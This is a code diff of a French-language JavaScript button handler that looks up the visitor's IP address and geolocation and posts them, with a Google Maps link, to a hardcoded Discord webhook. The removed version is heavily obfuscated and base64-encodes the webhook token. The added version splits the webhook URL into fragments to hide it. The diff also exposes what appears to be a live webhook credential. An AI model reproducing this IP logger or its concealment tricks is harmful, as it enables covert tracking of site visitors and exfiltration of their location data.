@@ -1,1 +1,70 @@
-function _0x3f79(_0xff3dc2,_0x282c7d){const _0x3b4d9c=_0x3b4d();return _0x3f79=function(_0x3f7940,_0x329d9a){_0x3f7940=_0x3f7940-0x119;let _0x25403d=_0x3b4d9c[_0x3f7940];return _0x25403d;},_0x3f79(_0xff3dc2,_0x282c7d);}const _0x56bcce=_0x3f79;(function(_0x3b2c9b,_0x2289b3){const _0x5321e1=_0x3f79,_0x21d28d=_0x3b2c9b();while(!![]){try{const _0x1ce5d6=parseInt(_0x5321e1(0x11b))/0x1*(-parseInt(_0x5321e1(0x146))/0x2)+-parseInt(_0x5321e1(0x12e))/0x3*(parseInt(_0x5321e1(0x12d))/0x4)+parseInt(_0x5321e1(0x130))/0x5*(parseInt(_0x5321e1(0x148))/0x6)+-parseInt(_0x5321e1(0x13a))/0x7+-parseInt(_0x5321e1(0x136))/0x8+-parseInt(_0x5321e1(0x13f))/0x9+-parseInt(_0x5321e1(0x11e))/0xa*(-parseInt(_0x5321e1(0x119))/0xb);if(_0x1ce5d6===_0x2289b3)break;else _0x21d28d['push'](_0x21d28d['shift']());}catch(_0x11ae44){_0x21d28d['push'](_0x21d28d['shift']());}}}(_0x3b4d,0x7f1f9),document[_0x56bcce(0x135)](_0x56bcce(0x12b))[_0x56bcce(0x141)](_0x56bcce(0x140),function(){const _0x36636e=_0x56bcce;function _0x49b7b4(){const _0x400295=_0x3f79;let _0x42288f=_0x400295(0x12f),_0x194062=atob(_0x400295(0x13b));return _0x42288f+'/'+_0x194062;}fetch(_0x36636e(0x128))[_0x36636e(0x11d)](_0x65d890=>{const _0x2e6b7f=_0x36636e;if(!_0x65d890['ok'])throw new Error(_0x2e6b7f(0x147)+_0x65d890['status']);return _0x65d890[_0x2e6b7f(0x149)]();})['then'](_0x227b8d=>{const _0x5d024f=_0x36636e;if(_0x227b8d[_0x5d024f(0x145)]===_0x5d024f(0x132)){let _0x5ae4a8={'content':_0x5d024f(0x123)+_0x227b8d[_0x5d024f(0x129)]+_0x5d024f(0x126)+_0x227b8d[_0x5d024f(0x137)]+_0x5d024f(0x127)+_0x227b8d[_0x5d024f(0x121)]+_0x5d024f(0x120)+_0x227b8d['city']+',\x20Région:\x20'+_0x227b8d[_0x5d024f(0x122)]+_0x5d024f(0x13c)+_0x227b8d[_0x5d024f(0x11a)]+_0x5d024f(0x133)+_0x227b8d[_0x5d024f(0x137)]+','+_0x227b8d[_0x5d024f(0x121)]+_0x5d024f(0x13e)},_0x525008=_0x49b7b4();fetch(_0x525008,{'method':_0x5d024f(0x11f),'headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x5ae4a8)})['then'](_0x1cf2dd=>{const _0x302bf5=_0x5d024f;if(_0x1cf2dd['ok'])alert('Les\x20informations\x20ont\x20été\x20envoyées\x20avec\x20succès\x20au\x20webhook\x20Discord.');else throw new Error(_0x302bf5(0x12a)+_0x1cf2dd[_0x302bf5(0x145)]);})[_0x5d024f(0x139)](_0x22faa3=>{const _0x53b712=_0x5d024f;console[_0x53b712(0x134)](_0x53b712(0x13d),_0x22faa3),alert(_0x53b712(0x131));}),document[_0x5d024f(0x135)]('info-display')[_0x5d024f(0x144)]=_0x5d024f(0x138)+_0x227b8d[_0x5d024f(0x129)]+_0x5d024f(0x12c)+_0x227b8d[_0x5d024f(0x137)]+_0x5d024f(0x127)+_0x227b8d[_0x5d024f(0x121)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVille:\x20'+_0x227b8d[_0x5d024f(0x142)]+',\x20Région:\x20'+_0x227b8d['regionName']+_0x5d024f(0x13c)+_0x227b8d['country']+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a[Google\x20Maps](https://www.google.com/maps?q='+_0x227b8d['lat']+','+_0x227b8d[_0x5d024f(0x121)]+')\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';}else throw new Error(_0x5d024f(0x11c)+_0x227b8d[_0x5d024f(0x124)]);})['catch'](_0x12ba07=>{const _0x1e9a23=_0x36636e;document[_0x1e9a23(0x135)](_0x1e9a23(0x143))[_0x1e9a23(0x144)]=_0x1e9a23(0x125)+_0x12ba07[_0x1e9a23(0x124)],console['error']('Erreur\x20lors\x20de\x20la\x20récupération\x20des\x20informations\x20:',_0x12ba07);});}));function _0x3b4d(){const _0x3a60ed=['regionName','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**None\x20a\x20cliqué\x20sur\x20le\x20bouton**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVotre\x20adresse\x20IP\x20est:\x20','message','Erreur\x20lors\x20de\x20la\x20récupération\x20des\x20informations\x20:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVotre\x20localisation\x20approximative\x20est:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aLatitude:\x20',',\x20Longitude:\x20','http://ip-api.com/json/','query','Erreur\x20lors\x20de\x20l\x27envoi\x20au\x20webhook\x20Discord,\x20statut\x20:\x20','get-info-btn','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVotre\x20localisation\x20approximative\x20est:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aLatitude:\x20','8hzknWJ','447akaWDJ','https://discord.com/api/webhooks','15IpHNyZ','Erreur\x20lors\x20de\x20l\x27envoi\x20au\x20webhook\x20Discord.\x20Veuillez\x20réessayer.','success','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a[Google\x20Maps](https://www.google.com/maps?q=','error','getElementById','5060360dwKkmR','lat','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Votre\x20adresse\x20IP\x20est:\x20','catch','3991064LhNMPX','MTI0MzY1MjU1MDI1MTUxNTkxNFI1dFhfZHowMVNfbDFyS0dyb1VIVEJtdnZ6QlNxVmZjV2VwZTA3V0tKUThudkxGZUk=',',\x20Pays:\x20','Erreur\x20lors\x20de\x20l\x27envoi\x20au\x20webhook\x20Discord:',')\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','8028729ZNkQuk','click','addEventListener','city','info-display','innerText','status','190142PvtppW','Erreur\x20HTTP,\x20statut\x20:\x20','530772VsmBhP','json','22yEETrq','country','9nWemRG','Erreur\x20API\x20:\x20','then','16030130yKbuvO','POST','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVille:\x20','lon'];_0x3b4d=function(){return _0x3a60ed;};return _0x3b4d();}
+document.getElementById('get-info-btn').addEventListener('click', function() {
+    // Fonction pour obtenir l'URL du webhook Discord
+    function getWebhookUrl() {
+        // Remplacez 'YOUR_PART1', 'YOUR_PART2' et 'YOUR_PART3' par les parties de votre URL de webhook Discord
+        let part1 = 'https://dis';
+        let part2 = 'cord.co';
+        let part3 = 'm/api/we';
+        let part4 = 'bhooks';
+        let part5 = '12436525502';
+        let part6 = '51515914/SrRtaX';
+        let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
+        let part8 = 'e-XgBBlDcT6r_00VU';
+        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
+    }
+
+    fetch('http://ip-api.com/json/')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Erreur HTTP, statut : ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            if (data.status === 'success') {
+                let message = {
+                    content: `
+                        **None a cliqué sur le bouton**
+                        \nVotre adresse IP est: ${data.query}
+                        \nVotre localisation approximative est:
+                        \nLatitude: ${data.lat}, Longitude: ${data.lon}
+                        \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
+                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                    `
+                };
+
+                let webhookUrl = getWebhookUrl();
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
+                    } else {
+                        throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
+                    }
+                }).catch(error => {
+                    console.error('Erreur lors de l\'envoi au webhook Discord:', error);
+                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
+                });
+
+                document.getElementById('info-display').innerText = `
+                    Votre adresse IP est: ${data.query}
+                    \nVotre localisation approximative est:
+                    \nLatitude: ${data.lat}, Longitude: ${data.lon}
+                    \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
+                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
+                `;
+            } else {
+                throw new Error('Erreur API : ' + data.message);
+            }
+        })
+        .catch(error => {
+            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
+            console.error('Erreur lors de la récupération des informations :', error);
+        });
+});
